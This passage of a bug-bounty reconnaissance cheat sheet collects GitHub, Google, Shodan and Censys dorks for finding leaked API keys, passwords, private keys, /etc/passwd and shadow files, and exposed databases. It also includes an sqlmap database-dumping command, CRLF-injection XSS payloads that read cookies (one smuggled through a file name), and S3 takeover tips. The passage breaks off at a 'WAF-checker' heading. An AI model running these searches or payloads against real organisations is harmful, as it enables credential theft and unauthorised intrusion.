org:Target "S3_SECRET_ACCESS_KEY"
password
path:sites databases password
private -language:java
PT_TOKEN language:bash
redis_password
root_password
secret_access_key
SECRET_KEY_BASE=
shodan_api_key language:python
WORDPRESS_DB_PASSWORD=
xoxp OR xoxb OR xoxa
s3.yml
.exs
beanstalkd.yml
deploy.rake
.sls
"access_key"
access_key
"access_token"
access-token
access_token
accesstoken
access_token_secret
admin
admin_pass
admin_user
algolia_admin_key
algolia_api_key
alias_pass
alicloud_access_key
"amazonaws"
amazonaws
amazon_secret_access_key
ansible_vault_password
aos_key
"apidocs"
apidocs
"api.googlemaps AIza"
api.googlemaps AIza
api.googlemaps+AIza
"api_key"
"apikey"
api-key
api_key
apikey
“api keys”
api_key_secret
api_key_sid
"api_secret"
api_secret
"apiSecret"
apiSecret
api_secret_key
“api token”
api_token
api_token:
app_debug
app_id
"app_key"
"appkey"
app_key
appkey
"appkeysecret"
appkeysecret
"application_key"
application_key
app_log_level
"app_secret"
"appsecret"
app_secret
appsecret
"appspot"
appspot
"auth"
auth
authentication
authkey
authorization
authorization_bearer:
authorization_key
authorization_token
"authorizationToken"
authorizationToken
authsecret
"auth_token"
auth_token
authtoken
"aws_access"
aws_access
"aws_access_key_id"
aws_access_key_id
aws_bucket
"aws_key"
aws_key
"aws_secret"
aws_secret
aws_secret_access_key
aws_secret_key
"AWSSecretKey"
AWSSecretKey
"aws_token"
aws_token
b2_app_key
"bashrc password"
bashrc password
bashrc+password
bearer
bintray_apikey
bintray_gpg_password
bintray_key
bintraykey
bluemix_api_key
bluemix_pass
bot_access_token
browserstack_access_key
bucket
bucketeer_aws_access_key_id
bucketeer_aws_secret_access_key
"bucket_password"
bucket_password
built_branch_deploy_key
bx_password
cache_driver
cache_s3_secret_key
cattle_access_key
cattle_secret_key
certificate_password
ci_deploy_password
client_id
client_key
"client_secret"
client-secret
client_secret
clientsecret
client_zpk_secret_key
clojars_password
cloudant_password
cloud_api_key
cloudflare_api_key
cloudflare_auth_key
"cloudfront"
cloudinary_api_secret
cloudinary_name
cloud_watch_aws_access_key
"codecov_token"
codecov_token
"config"
config
"connectionstring"
connectionstring
"conn.login"
conn.login
"consumer_key"
consumer_key
ConsumerKey
consumer_secret
ConsumerSecret
"credentials"
credentials
cypress_record_key
"database_password"
database_password
database_schema_test
datadog_api_key
datadog_app_key
DB_DATABASE=
DB_HOST=
"dbpasswd"
dbpasswd
"db_password"
"dbpassword"
db_password
dbpassword
DB_PASSWORD=
DB_PORT=
DB_PW=
db_server
"dbuser"
dbuser
DB_USER=
"db_username"
db_username
DB_USERNAME
deploy_password
digitalocean_ssh_key_body
digitalocean_ssh_key_ids
docker_hub_password
dockerhub_password
dockerhubpassword
docker_key
docker_pass
docker_passwd
docker_password
"dot-files"
"dotfiles"
dot-files
dotfiles
droplet_travis_password
dynamoaccesskeyid
dynamosecretaccesskey
elastica_host
elastica_port
elasticsearch_password
email
"encryption_key"
encryption-key
encryption_key
encryptionkey
encryption_password
env.heroku_api_key
env.sonatype_password
eureka.awssecretkey
extension:avastlic "support.avast.com"
extension:avastlic support.avast.com
extension:avastlic+support.avast.com
extension:bat
extension:cfg
extension:dbeaver-data-sources.xml
extension:env
extension:exs
extension:ini
extension:json api.forecast.io
extension:json+api.forecast.io
extension:json googleusercontent client_secret
extension:json+googleusercontent+client_secret
extension:json mongolab.com
extension:json+mongolab.com
extension:pem
extension:pem private
extension:pem+private
extension:ppk
extension:ppk private
extension:ppk+private
extension:properties
extension:sh
extension:sls
extension:sql
extension:sql mysql dump
extension:sql+mysql+dump
extension:sql mysql dump password
extension:sql+mysql+dump+password
extension:yaml mongolab.com
extension:yaml+mongolab.com
extension:zsh
"fabricApiSecret"
fabricApiSecret
facebook_secret
"fb_secret"
fb_secret
filename:bash
filename:.bash_history
filename:bash_history
filename:bash_profile
filename:.bash_profile aws
filename:.bash_profile+aws
filename:bashrc
filename:.bashrc mailchimp
filename:.bashrc+mailchimp
filename:.bashrc password
filename:.bashrc+password
filename:beanstalkd.yml
filename:CCCam.cfg
filename:composer.json
filename:config
filename:config irc_pass
filename:config+irc_pass
filename:config.json auths
filename:config.json+auths
filename:config.php dbpasswd
filename:config.php+dbpasswd
filename:configuration.php JConfig password
filename:configuration.php+JConfig+password
filename:connections
filename:connections.xml
filename:constants
filename:credentials
filename:credentials aws_access_key_id
filename:credentials+aws_access_key_id
filename:.cshrc
filename:cshrc
filename:database
filename:dbeaver-data-sources.xml
filename:deployment-config.json
filename:deploy.rake
filename:dhcpd.conf
filename:dockercfg
filename:.dockercfg auth
filename:.dockercfg+auth
filename:env
filename:.env DB_USERNAME NOT homestead
filename:.env+DB_USERNAME+NOT+homestead
filename:environment
filename:.env MAIL_HOST=smtp.gmail.com
filename:.env MAIL_HOSTsmtp.gmail.com
filename:.env+MAIL_HOSTsmtp.gmail.com
filename:.esmtprc password
filename:.esmtprc+password
filename:express.conf
filename:express.conf path:.openshift
filename:express.conf+path:.openshift
filename:filezilla.xml
filename:filezilla.xml Pass
filename:filezilla.xml+Pass
filename:.ftpconfig
filename:gitconfig
filename:.git-credentials
filename:git-credentials
filename:global
filename:.history
filename:history
filename:.htpasswd
filename:htpasswd
filename:hub oauth_token
filename:hub+oauth_token
filename:id_dsa
filename:idea14.key
filename:id_rsa
filename:id_rsa or filename:id_dsa
filename:id_rsa+or+filename:id_dsa
filename:known_hosts
filename:logins.json
filename:makefile
filename:master.key path:config
filename:master.key+path:config
filename:netrc
filename:.netrc password
filename:.netrc+password
filename:_netrc password
filename:_netrc+password
filename:npmrc
filename:.npmrc _auth
filename:.npmrc+_auth
filename:pass
filename:passwd path:etc
filename:passwd+path:etc
filename:.pgpass
filename:pgpass
filename:prod.exs
filename:prod.exs NOT prod.secret.exs
filename:prod.exs+NOT+prod.secret.exs
filename:prod.secret.exs
filename:proftpdpasswd
filename:recentservers.xml
filename:recentservers.xml Pass
filename:recentservers.xml+Pass
filename:.remote-sync.json
filename:robomongo.json
filename:.s3cfg
filename:s3cfg
filename:secrets.yml password
filename:secrets.yml+password
filename:server.cfg
filename:server.cfg rcon password
filename:server.cfg+rcon+password
filename:settings
filename:settings.py SECRET_KEY
filename:settings.py+SECRET_KEY
filename:sftp-config.json
filename:sftp-config.json password
filename:sftp.json path:.vscode
filename:sftp.json+path:.vscode
filename:shadow
filename:shadow path:etc
filename:shadow+path:etc
filename:.sh_history
filename:spec
filename:sshd_config
filename:travis.yml
filename:tugboat
filename:.tugboat NOT _tugboat
filename:.tugboat+NOT+_tugboat
filename:ventrilo_srv.ini
filename:vim_settings.xml
filename:WebServers.xml
filename:wp-config
filename:wp-config.php
filename:zhrc
"firebase"
firebase
flickr_api_key
fossa_api_key
"ftp"
ftp
ftp_password
FTP_PASSWORD
FTP_PORT
gatsby_wordpress_base_url
gatsby_wordpress_client_id
gatsby_wordpress_user
gh_api_key
ghost_api_key
"gh_token"
gh_token
github_api_key
github_deploy_hb_doc_pass
github_id
"github_key"
github_key
github_password
"github_token"
github_token
"gitlab"
gitlab
"gmail_password"
gmail_password
"gmail_username"
gmail_username
google_maps_api_key
google_private_key
google_secret
google_server_key
gpg_key_name
gpg_keyname
gpg_passphrase
HEROKU_API_KEY
HEROKU_API_KEY language:json
HEROKU_API_KEY+language:json
HEROKU_API_KEY language:shell
HEROKU_API_KEY+language:shell
"herokuapp"
herokuapp
heroku_oauth
heroku_oauth_secret
heroku_oauth_token
heroku_secret
heroku_secret_token
HOMEBREW_GITHUB_API_TOKEN
HOMEBREW_GITHUB_API_TOKEN language:shell
HOMEBREW_GITHUB_API_TOKEN+language:shell
htaccess_pass
htaccess_user
id_dsa
incident_channel_name
"internal"
internal
"irc_pass"
irc_pass
"JEKYLL_GITHUB_TOKEN"
JEKYLL_GITHUB_TOKEN
jsforce extension:js conn.login
jsforce+extension:js+conn.login
jwt_client_secret_key
jwt_lookup_secert_key
jwt_password
jwt_secret
jwt_secret_key
jwt_token
jwt_user
jwt_web_secert_key
jwt_xmpp_secert_key
"key"
key
"keyPassword"
keyPassword
language:bash ftp
language:python ftp
language:shell username
language:sql username
language:yaml -filename:travis
language:yaml+-filename:travis
"ldap_password"
ldap_password
"ldap_username"
ldap_username
linux_signing_key
ll_shared_key
location_protocol
log
log_channel
"login"
login
lottie_happo_api_key
lottie_happo_secret_key
lottie_s3_api_key
lottie_s3_secret_key
magento password
magento+password
"mailchimp"
mailchimp
mailchimp_api_key
mailchimp_key
"mailgun"
mailgun
mailgun apikey
mailgun+apikey
mailgun_key
mailgun_password
mailgun_priv_key
mailgun_secret_api_key
mail_password
mail_port
manage_key
mandrill_api_key
mapbox api key
mapbox+api+key
"master_key"
master_key
mg_api_key
mg_public_api_key
mh_apikey
mh_password
mile_zero_key
minio_access_key
minio_secret_key
mix_pusher_app_cluster
mix_pusher_app_key
".mlab.com password"
.mlab.com password
.mlab.com+password
msg nickserv identify filename:config
msg+nickserv+identify+filename:config
"mydotfiles"
mydotfiles
"mysql"
mysql
mysql password
mysql+password
mysql_root_password
netlify_api_key
nexus password
nexus+password
nexus_password
"node_env"
node_env
node_pre_gyp_accesskeyid
node_pre_gyp_secretaccesskey
npm_api_key
npm_password
"npmrc _auth"
npmrc _auth
npmrc+_auth
npm_secret_key
nuget_api_key
nuget_apikey
nuget_key
number
oauth
"oauth_token"
oauth_token
object_storage_password
octest_app_password
octest_password
okta_key
omise_key
onesignal_api_key
onesignal_user_auth_key
openwhisk_key
org_gradle_project_sonatype_nexus_password
org_project_gradle_sonatype_nexus_password
os_password
ossrh_jira_password
ossrh_pass
ossrh_password
OTP
pagerduty_apikey
parse_js_key
"pass"
pass
passcode
"passwd"
passwd
"password"
password
password hash
"passwords"
passwords
password travis
password+travis
path:sites databases password
path:sites+databases+password
paypal_secret
paypal_token
"pem private"
pem private
pem+private
personal_key
playbooks_url
plotly_apikey
plugin_password
postgres_env_postgres_password
postgresql_pass
"preprod"
preprod
private
"private_key"
private-key
private_key
privatekey
private -language:java
private+-language:java
private_signing_password
"prod"
prod
prod.access.key.id
prod_password
prod.secret.key
PT_TOKEN
PT_TOKEN language:bash
PT_TOKEN+language:bash
publish_key
pusher_app_id
"pwd"
pwd
"pwds"
queue_driver
rabbitmq_password
"rds.amazonaws.com password"
rds.amazonaws.com password
rds.amazonaws.com+password
"redis_password"
redis_password
remove password
response_auth_jwt_secret
rest_api_key
rinkeby_private_key
root
"root_password"
root_password
ropsten_private_key
route53_access_key_id
rtd_key_pass
rtd_store_pass
s3_access_key
s3_access_key_id
s3_key
s3_key_app_logs
s3_key_assets
s3_secret_key
salesforce_password
sandbox_aws_access_key_id
sandbox_aws_secret_access_key
sauce_access_key
"secret"
secret
"secret_access_key"
secret access key
secret+access+key
secret_access_key
secretaccesskey
secret_bearer
"secret_key"
secret-key
secret_key
secretkey
secret_key_base
"secret.password"
secret.password
"secrets"
secrets
"secret_token"
secret_token
"secure"
secure
"security_credentials"
security_credentials
sendgrid_api_key
sendgrid_key
sendgrid_password
"send.keys"
"send_keys"
"sendkeys"
send.keys
send_keys
sendkeys
ses_access_key
ses_secret_key
session_key
session_secret
SESSION_TOKEN
setdstaccesskey
setsecretkey
"sf_username"
sf_username
SF_USERNAME
"SF_USERNAME salesforce"
SF_USERNAME salesforce
SF_USERNAME+salesforce
shodan_api_key language:python
shodan_api_key+language:python
sid_token
signing_key_password
signing_key_secret
"slack_api"
slack_api
slack_api_token
SLACK_BOT_TOKEN
slack_channel
slack_key
slack_outgoing_token
slack_secret_token
slack_signing_secret
"slack_token"
slack_token
slack_webhook
slash_developer_space_key
snoowrap_password
socrata_password
sonar_organization_key
sonar_project_key
sonatype_password
sonatype_token_password
soundcloud_password
"sql_password"
sql_password
sqsaccesskey
square_access_token
squareSecret
square_token
"ssh"
ssh
"ssh2_auth_password"
ssh2_auth_password
ssh-key
ssh_key
sshkey
"sshpass"
sshpass
"staging"
staging
"stg"
stg
"storePassword"
storePassword
stormpath_api_key_id
stormpath_api_key_secret
"stripe"
stripe
stripe_key
stripe_secret
strip_key
strip_secret_key
stripToken
svn_pass
"swagger"
swagger
tesco_api_key
tester_keys_password
"testuser"
testuser
thera_oss_access_key
"token"
token
trash
trusted_hosts
twilio_account_id
twilio_account_secret
twilio_account_sid
twilio_accountsid
twilio_acount_sid NOT env
twilio_acount_sid+NOT+env
twilio_api
twilio_api_auth
twilioapiauth
twilio_api_key
twilio_api_secret
twilio_api_sid
twilio_api_token
twilio secret
twilio+secret
twilio_secret
twiliosecret
twilio_secret_token
TWILIO_SID NOT env
TWILIO_SID+NOT+env
twilio_token
twine_password
twitterKey
twitter_secret
user auth
username
user_pass
user_password
[WFClient] Password= extension:ica
WFClient Password extension:ica
WFClient+Password+extension:ica
"x-api-key"
x-api-key
xoxa-2
"xoxb "
xoxb 
xoxb+
"xoxp"
xoxp
xoxr
zendesk_api_token
zendesk_key
zendesk_token
zendesk_url
zendesk_username
zen_key
zen_tkn
zen_token
```

</dd>
</dl>

</details>

1. https://t.co/3pdCtOmjpWl

2. https://pinatahub.incognita.tech/

3. https://grep.app/

</dd>
</dl>

</details>

<details>
<summary>Google Dorking :</summary>

<dl>
<dd>

<details>
<summary>https://github.com/Mikestr0/DOrky</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

$`git clone https://github.com/Mikestr0/DOrky.git`

$Change into the project directory.

$`python3 setup.py install`

</dd>
</dl>

</details>

<details>
<summary>Usage</summary>

<dl>
<dd>

$`dorky.py -d google.com -r dorks.txt`

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/1N3/Goohak</summary>



</details>

<details>
<summary>https://github.com/A3h1nt/Grawler</summary>



</details>

<details>
<summary>https://github.com/Zarcolio/sitedorks</summary>



</details>

<details>
<summary>https://github.com/TebbaaX/GRecon</summary>



</details>

<details>
<summary>https://github.com/six2dez/degoogle_hunter</summary>



</details>

<details>
<summary>https://github.com/R4yGM/dorkscout</summary>



</details>

<details>
<summary>https://github.com/vinnyvinoth/GoogD0rker</summary>



</details>

<details>
<summary>https://github.com/Proviesec/google-dorks</summary>



</details>

<details>
<summary>Dorks</summary>

<dl>
<dd>

```
𝘀𝗶𝘁𝗲:*-*.𝘁𝗮𝗿𝗴𝗲𝘁.*
site:*.example.org -www -store -jobs -uk
site:groups.google.com "COMPANY"
intext:"© 2018 Sony Electronics Inc. All rights reserved"
site:"sony.com.*"
site:.s3.amazonaws.com "Sony"
site:target.com intext:login intext:username intext:password
site:*.com ext:ppt intext:password
site:*.com filetype:xls inurl:"email.xls"
allintext:username filetype:log
inurl:/proc/self/cwd
"index of" "database.sql.zip"
site:target.com inurl:admin "@gmail.com"
inurl:zoom.us/j and intext:scheduled for
allintitle: restricted filetype:doc site:gov
intitle:"Index of" wp-admin
inurl:Dashboard.jspa intext:"Atlassian Jira Project Management Software"


https://drive.google.com/file/d/1g-vWLd998xJwLNci7XuZ6L1hRXFpIAaF/view

inurl:<COMPANY_NAME> intitle:JIRA
inurl:<COMPANY_NAME> intitle:JIRA
site:*.<HOSTNAME>.com filetype:jspa
site:*.<HOSTNAME>.com ext:jspa
site:your-target.com inurl:id=
site:your-target.com filetype:php
site:your-target.com intitle:upload
inurl:”.php?id=” intext:”View cart”
inurl:”.php?cid=” intext:”shopping”
inurl:/news.php?include=
inurl:”.php?query=”
1-allintext:username filetype:log
2-inurl:/proc/self/cwd
3-intitle:"index of" inurl:ftp
4-filetype:log username putty
5-filetype:xls inurl:"email.xls"
6-intitle:index.of id_rsa -id_rsa.pub
7-"index of" "http://database.sql.zip"
8-intitle:"Index of" wp-admin
9-intitle:"Apache2 Ubuntu Default Page: It works"
10-"Index of" inurl:phpmyadmin
11-inurl:Dashboard.jspa intext:"Atlassian Jira Project Management Software"
12-inurl:app/kibana intext:Loading Kibana
13-inurl:_cpanel/forgotpwd
14-allintitle: restricted filetype:doc site:gov


#sensitive info :
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
intitle:"index of" "WebServers.xml"
filetype:xls inurl:"email.xls"
intitle:"Index of" wp-admin
intitle:"index of" "admin/sql/"
intitle:"index of" "system/config"
intitle:"index.of" id_rsa inurl:gov.*
intitle:"index.of" private.key inurl:gov.*
intitle:"index.of" /etc/passwd site:http://xyz.com

site:codepad.co "company"
site:scribd.com "company"
site:npmjs.com "company"
site:npm.runkit.com "company"
site:libraries.io "company"
site:ycombinator.com "company"
site:coggle.it "company"
site:papaly.com "company"
site:google.com "company"
site:trello.com "company"
site:prezi.com "company"
site:jsdelivr.net "company"
site:codepen.io "company"
site:codeshare.io "company"
site:sharecode.io "company"
site:pastebin.com "company"
site:repl.it "company"
site:productforums.google.com "company"
site:gitter.im "company"
site:bitbucket.org "company"
site:zoom.us inurl:"company"
site:atlassian.net "company"
site:http://repl.it intext:company
site:http://zoom.us inurl:company
site:http://scribd.com intext:http://internal.company.com
site:http://company.com ext:log
site:http://company.com inurl:redir | inurl:redirect | inurl:return | inurl:to
site:http://company.com ext:doc | ext:docx | ext:odt | ext:pd
site:http://company.com ext:sql
site:http://s3.amazonaws.com inurl:company
site:http://pastebin.com inurl:company
site:http://company.com intitle:Index of

site:http://atlassian.net inurl:company

site:s3.amazonaws.com inurl:"company"
inurl:gitlab "company"

Some google dork I’m use it to find sign up pages
site:http://example.com inurl:register
site:http://example.com inurl:signup
site:http://example.com inurl:join

# When you use the Google Dork:  site:*.example.com, NEVER forget to check
site:*.*.example.com
site:*.*.*.example.com


# Login panel search
site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login

# Login panel search #2
intitle:"login" "admin" site:target.com

# Admin panel search
inurl:admin site:target.com

# Search for our target's exposed files
site:target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb

# Get open directories (index of)
intitle:"index of /" Parent Directory site:target.com

# Search for exposed admin directories
intitle:"index of /admin" site:target.com

# Search for exposed password directories
intitle:"index of /password" site:target.com

# Search for directories with mail
intitle:"index of /mail" site:target.com

# Search for directories containing passwords
intitle:"index of /" (passwd | password.txt) site:target.com

# Search for directories containing .htaccess
intitle:"index of /" .htaccess site:target.com

# Search for .txt files with passwords
inurl:passwd filetype:txt site:target.com

# Search for potentially sensitive database files
inurl:admin filetype:db site:target.com

# Search for log files
filetype:log site:target.com

# Search for other sites that are linking to our target
link:target.com -site:target.com

#Open Redirect
inurl:url=https
inurl:url=http
inurl:u=https
inurl:u=http
inurl:redirect?https
inurl:redirect?http
inurl:redirect=https
inurl:redirect=http
inurl:link=http
inurl:link=https
inurl:redirectUrl=http site:paypal.com



#Codepad - Online Interpreter/Compiler, Sometimes Hard Coded Creds
site:codepad.co "Tesla"

#Scribd - EBooks / Although Sometimes Internal Files
site:scribd.com "Tesla"

#NodeJS Source
site:npmjs.com "Tesla"
site:npm.runkit.com "Tesla"

#Libararies IO
site:libraries.io "Tesla"

#Coggle - MindMapping Software
site:coggle.it "Tesla"

#Papaly
site:papaly.com "Tesla"

#Trello - Board Software
site:trello.com "Tesla"

#Prezi - Presentation Software
site:prezi.com "Tesla"

#JSDeliver - CDN for NPM & GitHub
site:jsdelivr.net "Tesla"

#Codepen - Online Coding Tool
site:codepen.io "Tesla"

#Pastebin - Online Txt Sharing
site:pastebin.com "Tesla"

#Repl - Online Compiler
site:repl.it "Tesla"

#Gitter - Open Source Messaging
site:gitter.im "Tesla"

#BitBucket - Similar to GitHub can Store Source Code
site:bitbucket.org "Tesla"

#Atlassian - Useful to find Confluence and Jira
site:*.atlassian.net "Tesla"

#Gitlab - Source Code
inurl:gitlab "Tesla"

#Find S3 Buckets
site:.s3.amazonaws.com "Tesla"

To simplify this process I copy the above into Sublime and copy replace Tesla with the Target name and then open all queries at once with the following chrome extension ;)

https://chrome.google.com/webstore/detail/openlist/nkpjembldfckmdchbdiclhfedcngbgnl?hl=en

# Code share sites
site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net "company"

# GitLab/GitHub/Bitbucket
site:github.com | site:gitlab.com | site:bitbucket.org "company"

# Stackoverflow
site:stackoverflow.com "target.com"

# Project management sites
site:http://trello.com | site:*.atlassian.net "company"

# Pastebin-like sites
site:http://justpaste.it | site:http://pastebin.com "company"

# Config files
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini

# Database files
site:target.com ext:sql | ext:dbf | ext:mdb

# Backup files
site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup

# .git folder
inurl:"/.git" target.com -github

# Exposed documents
site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv

# Other files
site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo "published by the PHP Group" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:"/phpinfo.php" | inurl:".htaccess" | ext:swf

# SQL errors
site:target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"

# PHP errors
site:target.com "PHP Parse error" | "PHP Warning" | "PHP Error"

# Login pages
site:target.com inurl:signup | inurl:register | intitle:Signup

# Open redirects
site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http

# Apache Struts RCE
site:target.com ext:action | ext:struts | ext:do

# Search in pastebin
site:pastebin.com target.com

# Linkedin employees
site:linkedin.com employees target.com

# Wordpress files
site:target.com inurl:wp-content | inurl:wp-includes

# Subdomains
site:*.target.com

# Sub-subdomains
site:*.*.target.com

#Find S3 Buckets
site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com "target"

# Traefik
intitle:traefik inurl:8080/dashboard "target"

# Jenkins
intitle:"Dashboard [Jenkins]"
```

</dd>
</dl>

</details>

<details>
<summary>https://dorks.faisalahmed.me</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/cipher387/Dorks-collections-list</summary>



</details>

<details>
<summary>https://github.com/R0X4R/Agnee</summary>



</details>

<details>
<summary>Alien-Vault urls fetch</summary>

<dl>
<dd>

https://github.com/emadshanab/otxurls

</dd>
</dl>

</details>

<details>
<summary>Shodan Dorks</summary>

<dl>
<dd>

<details>
<summary>Dorks</summary>

<dl>
<dd>

ssl:"target.com" http.html:"Login, username, password"  
ssl:"target.com" http.html:"Login, username,password" -http.html:"403 Forbidden"  
http.title:"Admin"  
ssl:"target.com" port:"2082"  
ssl:"target.com" org:"Cloudflare, Inc."  
ssl:"target.com" product:"nginx"  
ssl:"target.com" org:"Cloudflare, Inc." product:"nginx" 200  
kibana content-length:217 net:”cidr”  
org:”Amazon” ssl:”target”  
ssl:”target”  
html:”Dashboard Jenkins” http.component:”jenkins”  
http.title:”302 Found”  
http.component%3A”java”  
https://www.shodan.io/host/ip#9200https://www.shodan.io/host/ip  
X-Redirect-By: WordPress ssl:”name”  
query: html:”eBay Inc. All Right Reserved”  
X-Amz-Bucket-Region  
x-jenkins 200

ssl:target 200 http.title:"Dashboard [Jenkins]”  
X-Generator: Drupal 7  
ssl:Google  
org:’Name’ port:’80’  
all:”mongodb server information” all:”metrics”  
port:27017 -all:”partially” all:”fs.files”  
port:”9200" all:”elastic indices”  
product:elastic port:9200  
product: CouchDB  
title:”system dashboard” html:jira  
product: “apache tomcat”  
ssl%3A”development”+org%3A”Amazon.com”+port%3A”number”  
http.component:ruby port:3000  
html:”secret\_key\_base”

html:”rack.version”  
http.html:QUERY ssl:”domain.com”  
http.favicon.hash:81586312 200  
html:/dana-na/ Pulse Secure VPN exploit  
"MongoDB Server Information" port:27017 -authentication  
"Set-Cookie: mongo-express=" "200 OK"  
mysql port:"3306"  
port:"9200" all:"elastic indices"  
port:5432 PostgreSQL  
"220" "230 Login successful." port:21  
proftpd port:21  
port:"25" product:"exim"  
port:"11211" product:"Memcached"  
"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"  
"port: 53" Recursion: Enabled  
product:"Apache httpd" port:"80"  
product:"Microsoft IIS httpd"  
ssl.cert.issuer.cn:example.com ssl.cert.subject.cn:example.com  
ssl.cert.expired:true  
"Authentication: disabled" port:445  
"220" "230 Login successful." port:21

</dd>
</dl>

</details>

<details>
<summary>https://twitter.com/PadsalaTushal/status/1527221740841353216</summary>



</details>

<details>
<summary>https://github.com/IFLinfosec/shodan-dorks</summary>



</details>

<details>
<summary>https://github.com/topics/shodan-dorks</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Censys dorks</summary>

<dl>
<dd>

services.http.response.body:"keyword"  
services.tls.certificates.leaf\_data.subject.organization:  
services.tls.certificates.leaf\_data.subject.common\_name  
activate virtual hosts search (see img)

parsed.names: http://domain.com

</dd>
</dl>

</details>

<details>
<summary>Shodan best use to find vulns</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

1. Resolve all subdomains to IP addresses. Save IPs to list1.txt  
2. Find the organization name http://target.com uses in SSL certificates  
3. Go to http://shodan.io and search ssl:"Target Company"

4. Save the IPs you get from http://shodan.io in list2.txt  
5. Remove all the list1.txt IPs from list2.txt  
That's it. You now have a list of target's IPs that don't have a subdomain hosted on them. :)  
You can use smap's -oS option to find vulns :)

https://github.com/s0md3v/Smap

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

How to find SQLI using Shodan

1. Shodan dork: SSL:""

2. Found employee's admin portal and username input vulnerable to sqli.

3. Sqlmap command:  
   Sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs --hostname --current-user -p "username"

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

https://twitter.com/AseemShrey/status/1508059759491964928

</dd>
</dl>

</details>

<details>
<summary>Tip 4</summary>

<dl>
<dd>

https://twitter.com/atomiczsec/status/1560104164641935360?s=20&t=_831qCX4RPyKiAIP8NhfMQ

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Credentials Leak :</summary>

<dl>
<dd>

<details>
<summary>Install</summary>

<dl>
<dd>

https://github.com/davidtavarez/pwndb

</dd>
</dl>

</details>

<details>
<summary>Usage</summary>

<dl>
<dd>

python3 pwndb.py --target asd@asd.com

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>CRLF Scan:</summary>

<dl>
<dd>

<details>
<summary>Reflected XSS using CRLF > `Can be done on mass scale`</summary>

<dl>
<dd>

GET /endpoint?url=%0d%0aSet-Cookie:test=test -> header added in response headers

GET /endpoint?url=%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script><!--

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Found CSRF bug bypass that leads to ATO without user interaction but on private program. If you ever see authenticity\_token make sure to know that CSRF bug is in front of you! Most of the time authenticity\_token token is not properly validated.

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

bypassing file content restrictions:  
in some cases you can do a crlf injection via filename  
x.png%22%0d%0a%0d%0a%0d%0a<script>alert(1)</script>

this will cause Content-Disposition to throw its content into the file

</dd>
</dl>

</details>

https://github.com/dwisiswant0/crlfuzz

</dd>
</dl>

</details>

<details>
<summary>Broken-Link checker:</summary>

<dl>
<dd>

https://github.com/stevenvachon/broken-link-checker

https://github.com/tomnomnom/burl

https://github.com/arshadkazmi42/blc

https://www.deadlinkchecker.com/website-dead-link-checker.asp

<details>
<summary>Tips</summary>

<dl>
<dd>

<details>
<summary>Use Dorking</summary>

<dl>
<dd>

site:target.com

intext:s3.amazonaws.com

site:target.com

intext:storage.googleapis.com

site:target.com

intext:herokuapp.com

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>S3 bucket scanners :</summary>

<dl>
<dd>

Best one : https://github.com/0xmoot/s3sec

https://github.com/Sy3Omda/slurp

https://github.com/yasinS/sandcastle

https://digi.ninja/projects/bucket_finder.php

https://github.com/sa7mon/S3Scanner

https://buckets.grayhatwarfare.com/

https://github.com/eth0izzle/bucket-stream

https://github.com/VirtueSecurity/aws-extender

https://github.com/nikhil1232/Bucket-Flaws

https://github.com/ARPSyndicate/S3Hunter

https://github.com/cybercdh/dirlstr

https://github.com/cr0hn/festin

`site:.s3.amazonaws.com "Tesla"`

</dd>
</dl>

</details>

<details>
<summary>S3 bucket takeover `Tip`</summary>

<dl>
<dd>

If you find a S3 subdomain takeover, you need to set up the S3 bucket in the correct region, otherwise it doesn't work.

1. To find the region, use `dig` to get the IP address, then put the IP into https://isitonaws.com to grab the region easily.

2. You can also use burp repeater to see the correct region for bucket in response headers.

</dd>
</dl>

</details>

<details>
<summary>Get api-keys from URLs:</summary>

<dl>
<dd>

1. https://github.com/elamaran619/zile

</dd>
</dl>

</details>

<details>
<summary>Osint tip, trello boards</summary>

<dl>
<dd>

Search for public Trello boards of companies, to find login credentials, API keys, etc. or if you aren't lucky enough, then you may find companies' Team Boards sometimes with tasks to fix security vulnerabilities

</dd>
</dl>

</details>

<details>
<summary>https://github.com/s0md3v/Arjun</summary>



</details>

<details>
<summary>WAF-checker:</summary>

<dl>
<dd>

